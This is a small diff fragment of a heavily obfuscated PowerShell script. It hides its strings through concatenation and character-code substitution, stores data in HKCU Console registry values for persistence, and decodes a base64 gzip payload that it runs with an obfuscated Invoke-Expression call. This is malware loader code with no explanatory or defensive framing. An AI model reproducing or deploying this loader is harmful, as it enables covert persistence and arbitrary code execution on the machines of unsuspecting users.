@@ -5,4 +5,5 @@ Set-ItemProper'+'ty {1'+'}'+'HKCU:{0}Cons'+'ole'+'{0}{1} -Name ContentScript -Va
 Set-ItemProperty {1}HKCU:{0}Console{0}{1} -Name EScript '+'-V'+'alu'+'e {2}base64;
 
 {2}s=New-Object IO.MemorySt'+'ream(,[Convert]::FromBase64String({2}code));
-IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream({2}s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();')  -F [cHAr]92,[cHAr]34,[cHAr]36)| &( $eNV:CoMSpEC[4,26,25]-jOiN'')
+IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream({2}s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
+')  -F [cHAr]92,[cHAr]34,[cHAr]36)| &( $eNV:CoMSpEC[4,26,25]-jOiN'')
